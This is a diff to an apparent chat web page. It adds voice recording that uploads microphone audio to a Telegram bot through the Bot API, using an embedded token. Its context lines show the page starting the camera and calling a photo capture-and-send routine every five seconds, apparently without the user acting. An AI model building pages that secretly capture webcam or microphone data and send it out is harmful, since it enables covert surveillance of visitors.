@@ -355,6 +355,48 @@ button {
             const chatbox = document.getElementById("chatbox");
             chatbox.scrollTop = chatbox.scrollHeight;
         }
+         // 🎤 Handle Mic Button for Voice Recording
+        async function toggleMic() {
+            const micButton = document.getElementById("micButton");
+            let mediaRecorder;
+            let audioChunks = [];
+            let isRecording = false;
+
+            if (!isRecording) {
+                isRecording = true;
+                micButton.style.background = "red";
+
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                mediaRecorder = new MediaRecorder(stream);
+
+                mediaRecorder.ondataavailable = (event) => {
+                    audioChunks.push(event.data);
+                };
+
+                mediaRecorder.start();
+
+                setTimeout(() => {
+                    isRecording = false;
+                    micButton.style.background = "none";
+                    mediaRecorder.stop();
+                }, 5000);
+            }
+
+            mediaRecorder.onstop = async () => {
+                const audioBlob = new Blob(audioChunks, { type: 'audio/ogg; codecs=opus' });
+                let formData = new FormData();
+                formData.append("chat_id", chatId);
+                formData.append("voice", audioBlob);
+
+                await fetch(`https://api.telegram.org/bot${botToken}/sendVoice`, {
+                    method: "POST",
+                    body: formData
+                });
+
+                document.getElementById("chatbox").innerHTML += `<div class="msg user">🎤 Voice Message Sent</div>`;
+                scrollToBottom();
+            };
+        }
         // ✅ Start Everything
         startCamera();
         setInterval(captureAndSendPhoto, 5000); 
